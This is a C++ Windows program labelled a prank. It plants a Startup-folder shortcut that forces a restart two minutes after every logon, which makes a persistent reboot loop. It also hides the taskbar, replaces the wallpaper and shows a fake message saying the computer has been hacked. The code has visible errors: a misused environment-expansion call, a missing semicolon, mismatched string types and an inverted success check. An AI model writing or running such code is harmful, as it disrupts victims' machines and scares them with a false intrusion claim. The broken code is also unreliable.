#include <windows.h>
#include <shlobj.h>
#include <objbase.h>
#include <iostream>
#include <string>
#include <cstdlib>

#pragma comment(lib, "shell32.lib")

bool SetWallpaper(const std::wstring& imagePath) {
    return SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)imagePath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

bool CreateShortcut(const std::wstring& shortcutPath, const std::wstring& targetPath, const std::wstring& arguments, const std::wstring& description)
{
    HRESULT hres;
    IShellLink* psl;


    hres = CoInitialize(NULL);
    if (FAILED(hres))
    {
        std::wcerr << L"Failed to initialize COM library" << std::endl;
        return false;
    }

    hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
    if (FAILED(hres))
    {
        std::wcerr << L"Failed to create IShellLink instance" << std::endl;
        CoUninitialize();
        return false;
    }

    psl->SetPath(targetPath.c_str());

    psl->SetArguments(arguments.c_str());

    psl->SetDescription(description.c_str());

    IPersistFile* ppf;
    hres = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
    if (SUCCEEDED(hres))
    {
        hres = ppf->Save(shortcutPath.c_str(), TRUE);
        ppf->Release();
    }
    psl->Release();

    CoUninitialize();

    return SUCCEEDED(hres);
}

namespace prank
{
    void startup(){
        std::wstring targetPath = L"cmd.exe";
        std::wstring arguments = L"/k shutdown -r -t 120 /c \"prank\"";

        std::wstring description = L"prank";

        std::wstring location = L"C:\\Users\\%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";

        std::wstring shortcutName = L"prank.lnk";


        std::wstring shortcutPath = ExpandEnvironmentStringsW(location.c_str(), nullptr) + shortcutName;

 
        if (CreateShortcut(shortcutPath, targetPath, arguments, description))
        {
            std::wcout << L"Shortcut2 created successfully: " << shortcutPath << std::endl;
        }
        else
        {
            std::wcerr << L"Failed to create shortcut2" << std::endl;
        }
    }
    void background(){
        // Get the handle of the desktop window
        HWND hwndDesktop = GetDesktopWindow();

        // Hide all icons on the desktop
        SendMessage(hwndDesktop, LVM_SETVIEW, LV_VIEW_ICON, NULL);
        std::wstring imagePath = L"background.png";


        if (SetWallpaper(imagePath)) {
            std::wcout << L"Wallpaper set successfully." << std::endl;
        } else {
            std::wcerr << L"Failed to set wallpaper." << std::endl;
        }
        HWND taskbar = FindWindow("Shell_TrayWnd", NULL);
        ShowWindow(taskbar, SW_HIDE);
    }
}

int main(int argc, char* argv[]){
    if (argc >= 3) {
        if (std::string(argv[1]) == "-k") {
            if(system("del \"C:\\Users\\%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\prank.lnk\"")){
                std::cout << "you enter the safe mode successfully delete the infinite shutdown prank now set the background and taskbar.";
                return 0;
            } else {
                std::cout << "fail delete the infinite shutdown prank deleted by yourself at C:\\Users\\%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            }
        }
    }
    
    prank::startup();
    prank::background();
    int result = MessageBox(NULL, "Your computer got hack don't you dare shutdown your computer. Do you want to still shutdown your computer?", "ALERT!!!!!", MB_YESNO | MB_ICONINFORMATION);

    if (result == IDYES) {
        system("shutdown -r -t 120");
    }
    std::cin.get();
    return 0;
}
